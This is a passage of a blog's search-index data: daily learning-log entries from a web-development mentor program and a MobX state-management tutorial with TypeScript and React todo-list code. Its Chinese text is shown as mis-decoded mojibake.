æœŸè¨±æ˜å¤©ä¸€å®šè¦è¶•é€²åº¦ã€‚","link":"/2022/03/17/mentor-program-day93/"},{"title":"mentor-program-day94","text":"ç¸½ç®—é€²å…¥ä¸‹å€‹é€²åº¦ã€‚ é€²åº¦ä»Šå¤©æŠŠå‰©ä¸‹çš„ Lidemy æœŸä¸­æ¸¬é©— åšå®Œäº†ã€‚ç™¼ç¾è‡ªå·±å°æ–¼ç‰©ä»¶ or é™£åˆ—çš„æ“ä½œå¯èƒ½é‚„ä¸å¤ ç†Ÿæ‚‰ï¼Œå¸Œæœ›ä»¥å¾Œèƒ½åœ¨é€™æ–¹é¢å¤šåŠ å¼·ã€‚ é †ä¾¿é™„ä¸Šä¸€ä¸‹åšå®Œæ¸¬é©—å¾Œå¯«çš„ç­†è¨˜ï¼š ç”¨ in é‹ç®—å­æª¢æŸ¥ Object çš„å±¬æ€§ JavaScript æ•´ç†è³‡æ–™çš„ç¯„ä¾‹ é€™å€‹è¿´åœˆå¯èƒ½è·Ÿä½ æƒ³çš„ä¸ä¸€æ¨£ å¾Œä¾†æœ‰ç©ºä¹Ÿå»çœ‹äº†ä¸€ä¸‹ ç€è¦½å™¨é‹ä½œå°è®€ï¼ŒæŠŠä¸€äº›ä»¥å‰ä¸å¤ªæ‡‚çš„å°ˆæœ‰åè©çµ¦å¼„æ¸…æ¥šäº†ä¸€äº›ï¼Œä¸éè¦è¬›å¾ˆç´°çš„è©±çœŸçš„é‚„è »è¤‡é›œçš„ï¼Œä¹‹å¾Œæœ‰æ©Ÿæœƒå†ç ”ç©¶å§ï¼ æœ€å¾Œé–‹å§‹é€²å…¥ä¸‹é€±çš„é€²åº¦ï¼Œé–‹å§‹æŠŠ [FE201] æ²’çœ‹å®Œçš„éƒ¨åˆ†çµ¦è£œé½Šï¼Œä½†å·®ä¸å¤šå¿«çµæŸäº†ã€‚ å­¸åˆ°çš„äº‹æƒ…å°æ–¼ Process å’Œ Thread ç›®å‰åªç†è§£äº†æœ€è¡¨å±¤çš„éƒ¨åˆ†ï¼Œä¹‹å¾Œæœ‰æ©Ÿæœƒçš„è©±æ‡‰è©²æœƒå»æ·±å…¥ç ”ç©¶çœ‹çœ‹ã€‚å¦‚æœèƒ½ç†è§£æ•´å€‹æ¶æ§‹çš„è©±æ„Ÿè¦ºæœƒå­¸åˆ°æ›´å¤šä¸åŒçš„æ±è¥¿ã€‚ ä»Šå¤©çœ‹ [FE201] å­¸åˆ°äº†å¾ˆå¤šè·Ÿç‰©ä»¶å°å‘æœ‰é—œçš„çŸ¥è­˜ï¼Œé‚„æœ‰æˆ‘ä»¥å‰ä¸€ç›´æ²’å¼„æ‡‚çš„ Prototypeï¼Œç›®å‰ç­†è¨˜åšäº†ä¸€åŠï¼Œç­‰å®Œæˆå¾Œå°±èƒ½è²¼ä¸Šä¾†é€™è£¡äº†ã€‚ ä»Šå¤©å¤§æ¦‚å°±æ˜¯é€™æ¨£ï¼Œæ­å–œè‡ªå·±é€²å…¥ä¸‹é€±é€²åº¦ï¼ é¡Œå¤–è©±çœ‹åˆ°ä¸å°‘äººå„˜ç®¡å¹´ç´€å¤§äº†é‚„æ˜¯åœ¨è¿½æ±‚ç†æƒ³ï¼Œå°±æœƒå¸Œæœ›è‡ªå·±æ›´åŠ å …æŒä¸‹å»ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠ [FE201] çœ‹å®Œè·Ÿåšå®Œç­†è¨˜ï¼Œå¯ä»¥é †ä¾¿åšä½œæ¥­çš„è©±å°±æ›´å¥½äº†ã€‚","link":"/2022/03/18/mentor-program-day94/"},{"title":"mentor-program-day95","text":"é‚„å‰©ä¸‹å¤§æ¦‚ 70 å¤©å°±çµæŸäº†ã€‚ é€²åº¦ä»Šå¤©æŠŠ [FE201] çš„éƒ¨åˆ†çœ‹å®Œäº†ï¼Œä¹Ÿåšå¥½äº†ç­†è¨˜ï¼š ä»€éº¼æ˜¯ç‰©ä»¶å°å‘ ES6 å¯¦ä½œç‰©ä»¶å°å‘ ES5 å¯¦ä½œç‰©ä»¶å°å‘ ç†è§£åŸå‹éŠçš„é‹ä½œ new å¯¦éš›ä¸Šåœ¨åšä»€éº¼ï¼Ÿ ç‰©ä»¶å°å‘ä¹‹ç¹¼æ‰¿ é‡æ–°ç†è§£ this çš„å€¼ åšå®Œç­†è¨˜å¾Œå»çœ‹äº†èª²ç¶±æä¾›çš„å…©å€‹è£œå……æ•™æï¼Œä½†ç­†è¨˜é‚„æ²’åšå®Œï¼Œæ˜å¤©å†ä¾†è£œé½Šå§ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©æŠŠæˆ‘ä»¥å‰æœ€å®³æ€•çš„å…©å€‹æ±è¥¿ææ‡‚ 90% äº†ï¼Œä¸€å€‹æ˜¯åŸå‹éŠï¼Œä¸€å€‹æ˜¯ thisã€‚ é‚„è¨˜å¾—ä»¥å‰å° __proto__ éå¸¸é ­ç—›ï¼Œä¸€ä¾†æ˜¯å®ƒæœ¬èº«å°±é•·å¾—å¾ˆå¥‡æ€ªï¼ŒäºŒä¾†æ˜¯è·Ÿå„ç¨® prototype ç³¾çºä¸æ¸…ã€‚ä¹Ÿè¨±æ˜¯å› ç‚ºç•¶æ™‚æˆ‘å°ç‰©ä»¶å°å‘å®Œå…¨æ²’æœ‰æ¦‚å¿µï¼Œæ‰€ä»¥é€™æ±è¥¿å­¸èµ·ä¾†æ ¼å¤–çš„ç—›è‹¦ã€‚ å¦‚æœä¸æ‡‚ç‰©ä»¶å°å‘çš„è©±æœƒå¾ˆé›£ç†è§£ instance.__proto === Class.prototype ä¹‹é–“åˆ°åº•ç‚ºä»€éº¼æœƒæœ‰é—œè¯ï¼Œæ›´ç„¡æ³•ç†è§£ instance.__proto__.__proto__ === Object.prototype åˆæ˜¯æ€éº¼ä¾†çš„ã€‚ æ‰€ä»¥æˆ‘ç¾åœ¨äº†è§£ï¼Œåœ¨å­¸åŸå‹éŠä»¥å‰è‡³å°‘è¦å…ˆç†è§£ç‰©ä»¶å°å‘çš„ class å’Œ instance æ˜¯ä»€éº¼ï¼Œä¸ç„¶ä½ å¾ˆé›£æƒ³é€šåŸå‹éŠåˆ°åº•åœ¨å¹¹ä»€éº¼ã€‚ æ¥è‘—æ˜¯ this é€™ç©æ„å…’ã€‚åœ¨åƒèˆ‡é€™ä»½è¨ˆç•«å‰ä»¥å‰ï¼Œæˆ‘å° this ç†è§£å¯ä»¥èªªæ˜¯äº‚ä¸ƒå…«ç³Ÿï¼Œå¯èƒ½ç¬¬ä¸€å¤©æˆ‘æœƒè·Ÿä½ èªª this æŒ‡å‘çš„æ˜¯ A ï¼Œéš”å¤©åˆè·Ÿä½ èªª this æŒ‡å‘çš„æ˜¯ Bï¼Œå°±æ˜¯é€™éº¼èª‡å¼µã€‚æˆ‘ä¸€ç›´ä»¥ä¾†éƒ½åœ¨é€ƒé¿å­¸ç¿’ thisï¼Œä¹Ÿè¨±æ˜¯å› ç‚ºç”¨åˆ°çš„æ©Ÿæœƒä¸æ˜¯é‚£éº¼å¤šï¼ˆä½†æ¥è§¸æ¡†æ¶å¾Œä¼¼ä¹å°±ä¸æ˜¯é€™å›äº‹äº†ï¼‰ï¼Œæ‰€ä»¥å°±ä¸€ç›´æ“ºåœ¨é‚£é‚Šäº†ã€‚ this è·ŸåŸå‹éŠä¸€æ¨£ï¼Œåªè¦ææ¸…æ¥šç‰©ä»¶å°å‘å¾Œå®ƒå…¶å¯¦å°±å–®ç´”è¨±å¤šï¼Œä¸éè¦å®Œå…¨ææ‡‚å°±åˆæ˜¯å¦å¤–ä¸€å›äº‹äº†ã€‚ è¦å®Œå…¨æ‡‚ this çš„è©±å¾—æŠŠ é€™ç¯‡æ–‡ç«  çµ¦çœ‹æ‡‚æ‰è¡Œå§ã€‚è®“æˆ‘æƒ³åˆ°ä¸€å€‹ç¬‘è©±ï¼š é€™å€‹ä½œè€…å¯«å¾—éå¸¸å¥½ï¼Œçœ‹å®Œå¾Œæˆ‘å®Œå…¨ä¸æ‡‚äº†ã€‚ é¡Œå¤–è©±ç›¸ä¿¡æœ‰æœä¸€æ—¥èƒ½æˆç‚ºå¿ƒç›®ä¸­ç†æƒ³çš„æ¨£å­ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½æŠŠç­†è¨˜åšå®Œï¼Œç„¶å¾Œé–‹å§‹å¯«ä½œæ¥­ã€‚","link":"/2022/03/19/mentor-program-day95/"},{"title":"mentor-program-day96","text":"ç¹¼çºŒå¾€å‰èµ°ã€‚ é€²åº¦ä»Šå¤©æŠŠç‰©ä»¶å°å‘çš„è£œå……æ•™æçœ‹å®Œäº†ï¼Œä¹Ÿä¾ç…§æ…£ä¾‹åšäº†ç­†è¨˜ï¼šå¾ PHP å†æ¢ç‰©ä»¶å°å‘ å¾Œä¾†åˆèŠ±äº†ä¸€é»æ™‚é–“çœ‹é€™éƒ¨æœ‰é»é•·çš„å½±ç‰‡ï¼šç¨‹å¼å°å¸«å¯¦é©—è¨ˆç•«ç¬¬äºŒæœŸï¼šWeek9-2 JavaScript åŸ·è¡ŒåŸç†ã€‚æ„Ÿè¦ºå°±ç•¶ä½œè¤‡ç¿’å§ï¼Œè£¡é¢çš„å…§å®¹ç¢ºå¯¦å’Œ [JS102] å·®ä¸å¤šï¼Œä¸éå°è¤‡ç¿’é‚„æ˜¯æœ‰å¹«åŠ©çš„ã€‚ æœ€å¾Œå°±å»åš week16 çš„ä½œæ¥­ï¼Œé›–ç„¶é‚„æ²’åšå®Œï¼Œä½†æ„Ÿè¦ºæ˜å¤©å°±èƒ½å®Œæˆäº†å§ã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨åšå®Œç­†è¨˜å¾Œï¼Œæ„Ÿè¦ºå°æ–¼ç‰©ä»¶å°å‘çš„å››å¤§è¦ç´ æœ‰æ›´æ¸…æ¥šä¸€äº›ï¼šé¡åˆ¥ã€å¯¦é«”ã€å°è£ã€ç¹¼æ‰¿ã€‚é›–ç„¶é‚„ä¸çŸ¥é“æˆ‘æœƒåœ¨ä»€éº¼åœ°æ–¹ç”¨åˆ°å®ƒå€‘ï¼Œä½†ç›¸ä¿¡ç¸½æœ‰ä¸€å¤©æœƒæ´¾ä¸Šç”¨å ´çš„ã€‚ ä»¥å‰ç¸½è¦ºå¾—èƒ½å­¸æœƒåŸå‹ç·´ã€é–‰åŒ…ã€thisã€hoisting çš„è©±æˆ‘å°±èƒ½èªªè‡ªå·±æ˜¯ã€Œç²¾é€š JavaScriptã€äº†å§ï¼Œä¸éäº‹å¯¦æ˜¯ä½ åªæœƒç™¼ç¾æœ‰æ›´å¤šçš„é€²éšçš„çŸ¥è­˜è¦å­¸å‘¢ã€‚ ä½†ä¹Ÿä¸è¨å­é€™æ¨£ï¼Œç•¢ç«Ÿè¦æˆç‚ºæœ€å¼·çš„é‚£å€‹äººå¾—ä»˜å‡ºå¾ˆå¤šå¾ˆå¤šå¾ˆå¤šï¼Œè€Œè·ŸçœŸæ­£çš„å¼·è€…æ¯”èµ·ä¾†æˆ‘ä»˜å‡ºçš„å¯èƒ½åªæ˜¯ä¸€ç‡ç‡è€Œå·²ã€‚ç¸½ä¹‹ï¼Œé‡è¦çš„æ˜¯çœ‹åˆ°è‡ªå·±ä¸€æ­¥ä¸€æ­¥æˆé•·ï¼Œä»¥å‰ä¸æ‡‚çš„æ±è¥¿ç¾åœ¨å¼„æ‡‚äº†ï¼Œå°±æ˜¯è »ä»¤äººé–‹å¿ƒçš„äº‹æƒ…ã€‚ é¡Œå¤–è©±ä¸çŸ¥ä¸è¦ºå°±è¦é‚å…¥ 100 å¤©äº†ï¼ŒåŠ æ²¹ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½æŠŠ week16 çš„ä½œæ¥­åšå®Œã€‚","link":"/2022/03/20/mentor-program-day96/"},{"title":"mentor-program-day97","text":"é‚„æ˜¯è€æ¨£å­ã€‚ é€²åº¦ä»Šå¤©é€²åº¦ä¸å¤šï¼ŒåªæŠŠ week16 çš„ä½œæ¥­åšå®Œè€Œå·²ï¼ˆç·´ç¿’é¡Œè·ŸæŒ‘æˆ°é‚„æ²’ï¼‰ï¼Œæ˜å¤©å¾—åœ¨æ›´åŠªåŠ›ä¸€é»æ‰è¡Œã€‚ å­¸åˆ°çš„äº‹æƒ…å¦‚æœä½œæ¥­æ˜¯ç°¡ç­”é¡Œï¼Œåœ¨å¯«å®Œå¾Œéƒ½æœƒç¿’æ…£æŠŠåŒå­¸å¯«çš„æ‹¿å‡ºä¾†çœ‹ï¼Œçœ‹ä»–å€‘æ˜¯æ€éº¼æ€è€ƒè·Ÿæ•˜è¿°ä¸€æ¨£æ±è¥¿çš„ã€‚ æœ‰äº›äººè·Ÿä»¥å‰çš„æˆ‘ä¸€æ¨£ï¼Œæœƒæƒ³æŠŠæ¯å€‹ç´°ç¯€éƒ½è¬›å¾—éå¸¸æ¸…æ¥šï¼Œä¸€é»é»éƒ½ä¸èƒ½æ¼æ‰çš„é‚£ä¸€ç¨®ã€‚ä¹Ÿæœ‰äº›äººæ˜¯æ¥µç°¡æ´¾çš„é‚£ä¸€ç¨®ï¼ŒåªæœƒæŠŠæ¯”è¼ƒè¡¨å±¤çš„æ±è¥¿å¯«å‡ºä¾†ï¼Œå‰©ä¸‹çš„ä¸æœƒç´°è«‡ã€‚ é‚£æˆ‘å‘¢ï¼Ÿåœ¨çœ‹å®Œå¾Œæˆ‘è¦ºå¾—è‡ªå·±æ˜¯è™•æ–¼ä¸­é–“çš„é‚£ç¨®ï¼Œä¸æœƒè¬›å¾—å¤ªç´°ï¼Œä½†ä¹Ÿä¸æœƒå¤ªæ·ºï¼Œç°¡å–®ä¾†èªªå°±æ˜¯å¯èƒ½çœ‹å¾—æ‡‚ï¼Œä½†é‚„æ˜¯è¦è‡ªå·±åœ¨æŸ¥è³‡æ–™ä¾†è£œå……é€™æ¨£å§ã€‚ ä¸éå“ªä¸€ç¨®æ¯”è¼ƒå¥½çœŸçš„é‚„è »é›£èªªå¾—ï¼Œé›–ç„¶å¯«çš„è©³ç´°æ¯”è¼ƒæœ‰æ©Ÿæœƒè®“å®Œå…¨ä¸æ‡‚çš„äººè½å¾—æ‡‚ï¼Œå¯æ˜¯ç›¸å°çš„æ•´å€‹ç¯‡å¹…æœƒæ‹‰çš„å¾ˆé•·ã€‚é€™æ™‚å€™å°±æœƒæœ‰å¦å¤–ä¸€å€‹å•é¡Œï¼Œæœƒä¸æœƒçœ‹åˆ°ä¸€åŠå°±çœ‹ä¸ä¸‹å»äº†ï¼Ÿ ä¸çŸ¥é“ï¼Œå¾ˆé›£èªªã€‚ æ‰€ä»¥æ•™å­¸æ˜¯ä»¶å›°é›£çš„äº‹æƒ…ï¼Œæ²’æœ‰èƒ½å¤ é©ç”¨æ–¼æ‰€æœ‰äººçš„æ•™æï¼Œåªæœ‰æœ€é©åˆæŸäº›äººçš„æ•™æã€‚ é¡Œå¤–è©±ç¬¬ä¸€æ¬¡åƒåˆ°ç›´æ¥åŠ ç”Ÿè¾£æ¤’çƒ¹èª¿çš„äº•é£¯ï¼Œé‚„è »ç¥å¥‡çš„å£å‘³ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠ week16 åšå®Œï¼Œç„¶å¾Œä¹Ÿè¨±èƒ½é †ä¾¿çœ‹ä¸€äº›è¦æ ¼æ›¸ã€‚ ç•¶ç„¶ï¼Œèƒ½é€²åˆ°ä¸‹é€±é€²åº¦çš„è©±ç•¶ç„¶å°±æ›´å¥½äº†ã€‚","link":"/2022/03/21/mentor-program-day97/"},{"title":"mentor-program-day98","text":"åŠªåŠ›å¾€çµ‚é»å‰é€²ã€‚ é€²åº¦ä»Šå¤©æŠŠ week16 çš„ç·´ç¿’é¡Œçµ¦åšå®Œäº†ã€‚æ„Ÿè¦ºèŠ±äº†æœ‰é»é•·çš„æ™‚é–“ï¼Œä¸éå­¸åˆ°çš„æ±è¥¿æˆ‘è¦ºå¾—å¾ˆæœ‰è¶£ï¼Œæ‰€ä»¥å¯«äº†ä¸€ç¯‡ç°¡çŸ­çš„æ–‡ç« ï¼šé–‰åŒ…çš„å¯¦éš›æ‡‰ç”¨ï¼šthrottle å’Œ debounce æ’é™¤æ‰æŒ‘æˆ°é¡Œçš„éƒ¨åˆ†ï¼Œé€™é€±ä¹Ÿç®—æ˜¯ç•«ä¸‹å¥é»äº†ï¼Œå¯ä»¥ç¹¼çºŒé€²å…¥ä¸‹ä¸€é€±äº†ï¼ŒåŠ æ²¹ï¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©é‡æ–°èªè­˜é–‰åŒ…çš„ç”¨é€”ï¼Œæˆ‘è¦ºå¾— throttle å’Œ debounce çœŸçš„è »å¯¦ç”¨çš„ï¼Œæ¯”èµ·ã€Œå…¬æœ‰æ–¹æ³• / ç§æœ‰æ–¹æ³•ã€çš„ä¾‹å­ï¼ŒçœŸçš„æœ‰è¶£å¾ˆå¤šã€‚ ä»¥å‰æˆ‘å°±ç¢°éå¦‚ä½•é¿å…è®“ scroll äº‹ä»¶ä¸€ç›´é‡è¤‡è§¸ç™¼çš„å•é¡Œï¼Œä½†ç•¶æ™‚æ²’æœ‰èŠ±æ™‚é–“å»ç ”ç©¶ï¼Œä¹Ÿå°é–‰åŒ…ä¸ç†Ÿï¼Œå®Œå…¨ä¸çŸ¥é“å¯ä»¥ç”¨åœ¨é€™è£¡ï¼Œé‚„è »å¯æƒœçš„ã€‚ ç¸½ä¹‹ï¼Œä»Šå¤©å­¸åˆ°äº†é€™å…©å€‹æ‡‰ç”¨çœŸå¥½ã€‚ å¦å¤–å°±æ˜¯å¯«ä½œæ¥­æ™‚ç‚ºäº†è®“ç­”æ¡ˆèƒ½å¤ é€šéæ¸¬è©¦ï¼Œä¹ŸèŠ±äº†äº›æ™‚é–“ç ”ç©¶æ¸¬è©¦æª”ï¼Œå­¸åˆ°äº† Unit test çš„æ–°æŠ€è¡“ï¼Œåƒæ˜¯ Mock functionï¼ˆæ›¿èº«å‡½å¼ï¼‰é€™æ±è¥¿ã€‚ä¸éé‚„æ²’æ™‚é–“åšç­†è¨˜ï¼Œä¹Ÿè¨±æ˜å¤©æœ‰ç©ºçš„è©±æœƒä¾†åšä¸€ä¸‹ã€‚ é¡Œå¤–è©±åŒæ¨£æ˜¯æè¿°ä¸€å€‹æ±è¥¿ï¼ŒA èŠ±äº†å¾ˆé•·çš„ç¯‡å¹…ä¾†è§£é‡‹ï¼Œä½† B å¯èƒ½åªéœ€è¦ä¸€å…©å¥è©±èƒ½è§£é‡‹æ¸…æ¥šã€‚æ„Ÿè¦ºå°±å’Œå¯«ç¨‹å¼é‚„è »åƒçš„ï¼Œæœ‰äº›äººå°±æ˜¯èƒ½ç”¨ä¸€å…©è¡Œ code æŠŠæ±è¥¿å®Œæˆï¼Œæœ‰äº›äººå»ä¸è¡Œã€‚ ä½†æ˜¯ä¸€å€‹èƒ½æŠŠè‡ªç„¶èªè¨€èªªå¾—å¥½çš„äººï¼Œå°±èƒ½è³­å®šä»–å¯« code ä¸€å®šä¹Ÿèƒ½å¯«å¾—å¥½å—ï¼Ÿæ„Ÿè¦ºä¹Ÿä¸æ˜¯é€™æ¨£å­ã€‚é›–ç„¶å¤§å¤šæ•¸æƒ…æ³æ˜¯é€™æ¨£æ²’éŒ¯ï¼Œå¯ç¸½æœƒæœ‰ä¾‹å¤–æƒ…æ³çš„å­˜åœ¨ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤© week17 çš„é€²åº¦ä¸€åˆ‡é †åˆ©ã€‚","link":"/2022/03/22/mentor-program-day98/"},{"title":"mentor-program-day99","text":"è¯éº—çš„è¶•é€²åº¦ã€‚ é€²åº¦ä»Šå¤©æŠŠæ˜¨å¤©å­¸çš„æ±è¥¿åšäº†ç­†è¨˜ï¼šä¸€å€‹åš Unit test å¯èƒ½æœƒç”¨åˆ°çš„æ–¹æ³•ï¼Œå¾Œä¾†å°±å»çœ‹ [BE201] äº†ã€‚ é›–ç„¶é€²åº¦é‚„ä¸å¤šï¼Œä½†é‚„æ˜¯ä¸€æ­¥ä¸€æ­¥åœ¨å¾€å‰èµ°ï¼Œç¹¼çºŒåŠ æ²¹ï¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©æ˜¯åˆæ¢ Express å’Œ MVC çš„ä¸€å¤©ï¼Œå¯ä»¥è‡ªå·±æ§åˆ¶è·¯ç”±çš„æ„Ÿè¦ºå¾ˆä¸éŒ¯ï¼Œæ¯” Apache + PHP å¥½ç”¨å¾ˆå¤šã€‚å¦å¤– MVC çš„æ¶æ§‹ä¹Ÿå¾ˆå¥½ï¼Œé›–ç„¶é‚„åœ¨æ…¢æ…¢ç¿’æ…£é€™ç¨®åˆ‡å‰²è·è²¬çš„æ–¹å¼ï¼Œä½†ç›¸ä¿¡æœƒè¶Šè¶Šç†Ÿæ‚‰çš„ã€‚ é¡Œå¤–è©±å¸Œæœ›çªä¾†çš„åœ°éœ‡æ²’æœ‰å‚·å®³åˆ°äººã€‚ æœŸè¨±æ˜å¤©è¦ç¹¼çºŒåŠªåŠ›è¶•é€²åº¦ã€‚å¸Œæœ›å¯ä»¥æŠŠ [BE201] çœ‹åˆ° 50% å·¦å³ã€‚","link":"/2022/03/23/mentor-program-day99/"},{"title":"å†æ¢ mobxï¼Œæ›å€‹å£å‘³çš„å¯«æ³•","text":"è »æœ‰æ„æ€çš„ã€‚ ç°¡è¿°é™„è¨»ï¼šå¾Œä¾†ç™¼ç¾å…¶å¯¦é€™ç¯‡çš„ç²¾é«“åœ¨æ–¼ã€Œmobx æä¾›çš„ä¸åŒ APIã€è®“ä½ èƒ½ç”¨ä¸åŒçš„æ–¹æ³•ä¾†å»ºç«‹ storeã€‚ç¸½ä¹‹æ¨è–¦å»çœ‹é€™ä»½ å®˜æ–¹æ–‡ä»¶ï¼Œæˆ‘è¦ºå¾—å¯«å¾—é‚„è »æ¸…æ¥šçš„ã€‚ åœ¨ ä¾†é»ä¸ä¸€æ¨£çš„ç‹€æ…‹ç®¡ç† mobx ä¸­å·²ç¶“ä»‹ç´¹éåŸºæœ¬çš„ mobx è§€å¿µï¼Œå¿˜è¨˜çš„è©±å¯ä»¥å›å»è¤‡ç¿’ä¸€ä¸‹ã€‚ ç•¶æ™‚æˆ‘å€‘æ˜¯é€é class ä¾†å»ºç«‹ä¸€å€‹ storeï¼ŒæŠŠæ‰€æœ‰ actionã€computedã€state éƒ½å¯«åœ¨ä¸€èµ·ï¼Œåƒé€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import { action, computed, makeObservable, observable } from 'mobx'interface TodoItem { id: number name: string completed: boolean}export class TodoStoreImpl { todos: TodoItem[] = [] constructor() { makeObservable(this, { todos: observable, addTodo: action, toggleTodo: action, states: computed }) } addTodo(name: string): void { const item: TodoItem = { id: new Date().getTime(), name, completed: false } this.todos.push(item) } toggleTodo(id: number): void { const index = this.todos.findIndex((item) =&gt; item.id === id) if (index &gt; -1) { this.todos[index].completed = !this.todos[index].completed } } get states() { let completed: number = 0 let remaining: number = 0 this.todos.forEach((item) =&gt; { if (item.completed) { completed++ } else { remaining++ } }) return { completed, remaining } }}export const TodoStore = new TodoStoreImpl() ç°¡å–®ä¾†èªªï¼Œæˆ‘å€‘æœƒå…ˆå¯«å¥½ä¸€å€‹ store çš„è—åœ–ï¼Œæ¥è‘—å†æŠŠ instance è¼¸å‡ºåˆ°å¤–é¢ã€‚ é›–ç„¶é€™æ¨£ä¹Ÿä¸éŒ¯ï¼Œä¸éå…¶å¯¦ä¹Ÿæœ‰ä¸éœ€è¦é€é class çš„å¯«æ³•ï¼Œä¸‹é¢å°±ä¾†ä»‹ç´¹ä¸€ä¸‹ã€‚ ç¯„ä¾‹é€™é‚Šä¸€æ¨£æœƒæ‹¿ Todo list ä¾†ç•¶ç¯„ä¾‹ï¼Œä¸éåœ¨é‚£ä¹‹å‰è¦å…ˆä»‹ç´¹ä¸€ä¸‹è³‡æ–™å¤¾çµæ§‹ã€‚ æˆ‘å€‘ç¾åœ¨ä¸æœƒå¯«æˆä¸€å€‹ todoStore.tsï¼Œè€Œæ˜¯è¦æ‹†æˆé€™æ¨£çš„çµæ§‹ï¼š 12345â””â”€â”€ state â”œâ”€â”€ action â”‚&nbsp;&nbsp; â””â”€â”€ todo.tsx â””â”€â”€ storage â””â”€â”€ todo.tsx ç°¡å–®ä¾†èªªå°±æ˜¯æŠŠ action å’Œ state çµ¦æ‹†é–‹ä¾†å¯«ï¼Œaction/todo.ts è£¡é¢åªæœƒæ”¾è·Ÿ action æœ‰é—œçš„æ±è¥¿ï¼Œè€Œ storage/todo.ts å‰‡æœƒæ”¾è·Ÿ state æœ‰é—œçš„æ±è¥¿ã€‚ æ¥è‘—å…ˆä¾†çœ‹ state çš„éƒ¨åˆ†ï¼š 12345678910111213141516171819202122232425262728293031import { observable } from 'mobx'type Todo = { id: number name: string completed: boolean}type State = { completed: number remaining: number}export const TodoStorage = observable({ // state todos: [] as Todo[], // computed get state(): State { let completed = 0 let remaining = 0 this.todos.forEach((item) =&gt; { if (item.completed) { completed++ } else { remaining++ } }) return { completed, remaining } }}) æˆ‘å€‘æœƒæœ‰ä¸€å€‹ todos çš„ stateï¼Œè·Ÿä¸€å€‹å·²å®Œæˆ / æœªå®Œæˆçš„ computedã€‚ å…¶å¯¦å°±è·Ÿ class çš„å¯«æ³•å¾ˆåƒï¼Œåªæ˜¯ç¾åœ¨æŠŠæ±è¥¿å…¨éƒ¨åŒ…æˆä¸€å€‹ object åœ¨ä¸Ÿåˆ° observable è£¡é¢è€Œå·²ã€‚ æ¥è‘—ä¾†çœ‹ actionï¼š 1234567891011121314151617import { action } from 'mobx'import { TodoStorage } from '../storage/todo'export const addTodo = action((name: string): void =&gt; { TodoStorage.todos.push({ id: new Date().getTime(), name, completed: false })})export const toggleTodo = action((id: number): void =&gt; { const index = TodoStorage.todos.findIndex((item) =&gt; item.id === id) if (index &gt; -1) { TodoStorage.todos[index].completed = !TodoStorage.todos[index].completed }}) æˆ‘å€‘æœƒæœ‰æ–°å¢ todo è·Ÿæ›´æ–° todo çš„å…©å€‹ actionã€‚ è·Ÿå‰›å‰›çš„åšæ³•å·®ä¸å¤šï¼Œæˆ‘å€‘æŠŠç”¨ä¾†åŸ·è¡Œçš„ function æ”¾åˆ° action è£¡é¢å»ï¼Œé€™æ¨£å°±å»ºç«‹å®Œæˆäº†ã€‚ æœ€å¾Œå°±æ˜¯è·Ÿ Component ä¸²èµ·ä¾†è€Œå·²ï¼Œæˆ‘ä¾†è²¼ä¸€æ®µï¼š 12345678910111213141516171819202122232425import React from 'react'import { TodoStorage } from '../state/storage/todo'import { toggleTodo } from '../state/action/todo'import { observer } from 'mobx-react-lite'// åˆ¥å¿˜äº†ä¸€æ¨£è¦ç”¨ observer ä¾†åŒ…ä½const TodoList: React.FC = observer(() =&gt; { return ( &lt;&gt; Completed: {TodoStorage.state.completed} &lt;br /&gt; Remaining: {TodoStorage.state.remaining} &lt;ul&gt; {TodoStorage.todos.map((item) =&gt; { return ( &lt;li onClick={() =&gt; toggleTodo(item.id)} key={item.id}&gt; [{item.completed ? 'X' : ' '}] {item.name} &lt;/li&gt; ) })} &lt;/ul&gt; &lt;/&gt; )})export default TodoList ä»¥ä¸Šå°±æ˜¯ç¬¬äºŒç¨®å¯«æ³•çš„ç¤ºç¯„ã€‚ æˆ‘è¦ºå¾—é€™ç¨®å¯«æ³•åœ¨æœ‰äº›æ™‚å€™æœƒæ›´ç›´è¦ºä¸€äº›ï¼Œå› ç‚ºé€éé€™ç¨®æ–¹å¼åœ¨ Component è£¡é¢å°±ä¸éœ€è¦æŠŠæ•´å€‹ store å¼•é€²ä¾†ï¼Œå¯ä»¥åªæŠŠéœ€è¦çš„ action æˆ– state æ‹¿ä¾†ç”¨å°±å¥½ï¼Œæ‰€ä»¥æœƒæ›´ç°¡æ½”ä¸€é»ã€‚ æœ€å¾Œè€æ¨£å­ï¼Œéœ€è¦ç¯„ä¾‹çš„è©±ä¾† é€™é‚Š çœ‹ã€‚ é—œæ–¼ observerå¯¦åœ¨ä¸çŸ¥é“é€™æ®µæ€éº¼ä¸‹æ¨™é¡Œï¼Œç¸½ä¹‹é€™é‚Šæƒ³ä¾†è«‡è«‡ã€Œé—œæ–¼é‡æ–°æ¸²æŸ“çš„å•é¡Œã€ï¼Œé€™è·Ÿ mobx ä¸­çš„ observer æœ‰ä¸€äº›é—œè¯ã€‚ æˆ‘å…ˆè¬›çµè«–ï¼Œå°±æ˜¯ï¼š observer ç„¡æ³•ç›´æ¥è§¸ç™¼å­å…ƒä»¶ re-render observer ç„¡æ³•ç›´æ¥è§¸ç™¼å­å…ƒä»¶ re-render observer ç„¡æ³•ç›´æ¥è§¸ç™¼å­å…ƒä»¶ re-render å¥½ï¼Œæˆ‘çŸ¥é“é€™æ¨£è¬›ä¸€å®šè½ä¸æ‡‚ï¼Œæ‰€ä»¥åˆåˆ°äº†æˆ‘å€‘çš„ç¯„ä¾‹æ™‚é–“ã€‚å‡è¨­æˆ‘æœ‰ä¸€æ®µ code çš„åŸºæœ¬çµæ§‹é•·é€™æ¨£ï¼š 1234567891011return ( &lt;div className='app'&gt; &lt;HashRouter&gt; &lt;Header /&gt; &lt;Routes&gt; &lt;Route path='' element={&lt;div&gt;hello&lt;/div&gt;} /&gt; &lt;Route path='login' element={&lt;Login /&gt;} /&gt; &lt;/Routes&gt; &lt;/HashRouter&gt; &lt;/div&gt;) 